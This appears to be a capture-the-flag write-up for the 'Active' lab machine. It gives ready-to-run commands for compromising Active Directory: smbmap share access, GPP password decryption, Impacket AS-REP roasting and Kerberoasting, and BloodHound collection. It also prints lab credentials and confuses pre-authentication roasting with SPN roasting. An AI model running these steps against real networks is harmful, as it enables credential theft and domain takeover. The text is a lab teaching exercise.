Name & IP Address of Machine:
> ACTIVE: `10.10.10.100`
<!-- TOC -->

- [Synopsis](#synopsis)
- [Enumeration](#enumeration)
- [FootHold](#foothold)
- [Enumeration](#enumeration-1)
- [Privilege Escalation](#privilege-escalation)

<!-- /TOC -->

**Hashes found**

`svc_tgs:GPPstillStandingStrong2k18`
`Administrator:Ticketmaster1968`

## Synopsis
```cmd.exe
runas /netonly /user:active.htb\svc_tgs cmd
```
To open a terminal as svc_tgs


## Enumeration
Scanning for open ports using nmap :
Important ports were: 
- [ ] 88 (KERBOROS)
- [ ] 135, 49152-58 (RPC-CLIENT)
- [ ] 445 (SMB-SERVER)
- [ ] 389 (LDAP) Lightweight Active Directory Protocol

## FootHold
- Login to samba server on port 445 via smbmap an find if you have read permission on any share.
- You do have read permission on Replication server.

## Enumeration
- Use smbmap to download a group.xml file which has credentials in it.
- Use gpp-decrypt to decrypt the hash and get user `svc_tgs`
- Now you have credentials, you can enumerate rpcclient to get `user.txt`. 
## Privilege Escalation
- You can try Impacket GetADUsers.py to enumerate other users or do it with `rpcclient`. 

    **Using GetADUsers.py**:
    ```bash
    GetADUsers.py -all active.htb/svc_tgs:GPPstillStandingStrong2k18
    ```
    **OR** using rpcclient:
    ```bash
    rpcclient $> enumdomusers
    ```
- Now find out which users don't require preauthencation so that you can grab his tgt or ticket. 
    ```bash
    GetNPUsers.py -usersfile user.txt active.htb/svc_tgs:GPPstillStandingStrong2k18
    ```
- Extract the hash of administrator which don't require pre-auth in kerboros.
    ```bash
    GetUserSPNs.py -u user.txt -dc-ip 10.10.10.100 active.htb/svc_tgs
    ```

**Alternatively With BloodHound**

- Bloodhound to extract information from the ldap and output in the zip format
    ```bash
    bloodhound-python -c all -u svc_tgs -d active.htb -ns 10.10.10.100 --zip
    ```
- Run bloodhound on your parrot machine and load zip file and 
    ```bash
    Run query`: `Shortest path from kerberoastable Users
    ```




<!-- ## Thank You 
🕉️  -->


<!-- ## Tools Used.
- [ ] . -->
